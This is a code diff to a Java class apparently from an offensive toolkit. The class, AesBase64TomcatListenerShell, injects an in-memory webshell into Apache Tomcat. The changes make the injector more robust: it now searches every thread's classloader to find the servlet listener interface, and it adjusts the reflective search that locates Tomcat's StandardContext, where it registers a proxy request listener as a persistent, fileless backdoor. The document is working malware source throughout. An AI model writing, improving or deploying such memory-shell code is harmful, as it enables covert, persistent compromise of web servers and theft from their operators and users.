@@ -25,22 +25,51 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                 try {
                     Class servletRequestListenerClass = null;
                     try {
-                        servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
+                        servletRequestListenerClass = loadClasses("jakarta.servlet.ServletRequestListener");
                     } catch (Exception e) {
                         try {
-                            servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
+                            servletRequestListenerClass = loadClasses("javax.servlet.ServletRequestListener");
                         } catch (ClassNotFoundException ex) {
 
                         }
                     }
                     if (servletRequestListenerClass!=null){
-                        addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{servletRequestListenerClass},this));
+                        addListener(Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(),new Class[]{servletRequestListenerClass},this));
                     }
                 }catch (Throwable e){
 
                 }
             }
         }
+    }
+
+    public Class loadClasses(String className) throws ClassNotFoundException {
+        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
+        classLoaders.add(this.getClass().getClassLoader());
+        try {
+            classLoaders.add(Thread.currentThread().getContextClassLoader());
+            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+            int threadCount = threadGroup.activeCount();
+            Thread[] threads = new Thread[threadCount];
+            threadCount = threadGroup.enumerate(threads);
+            for (int i = 0; i < threadCount; i++) {
+                classLoaders.add(threads[i].getContextClassLoader());
+            }
+        }catch (Exception e){
+
+        }
+        int loaders = classLoaders.size();
+        for (int i = 0; i < loaders; i++) {
+            ClassLoader loader = classLoaders.get(i);
+            if (loader!=null){
+                try {
+                   return Class.forName(className,true,loader);
+                }catch(Throwable e){
+
+                }
+            }
+        }
+        return Class.forName(className);
     }
 
 
@@ -65,7 +94,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
 
-        Object obj = searchObject("org.apache.catalina.core.StandardContext",Thread.currentThread(),new HashSet(),blackType,30,0);
+        Object obj = searchObject("org.apache.catalina.core.StandardContext",Thread.currentThread(),new HashSet(),blackType,10,0);
         if (obj != null) {
             contexts.add(obj);
             try {
@@ -77,10 +106,10 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDetch,int currentDetch)throws Throwable {
-        currentDetch++;
+    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+        currentDepth++;
 
-        if (currentDetch >= maxDetch){
+        if (currentDepth >= maxDepth){
             return null;
         }
 
@@ -118,14 +147,14 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                                     if (!blackType.contains(fieldType.getComponentType().getName())){
                                         int arraySize = Array.getLength(fieldValue);
                                         for (int j = 0; j < arraySize; j++) {
-                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDetch,currentDetch);
+                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
                                             if (ret!= null){
                                                 break;
                                             }
                                         }
                                     }
                                 }else{
-                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDetch,currentDetch);
+                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
                                 }
                                 if (ret!= null){
                                     return ret;
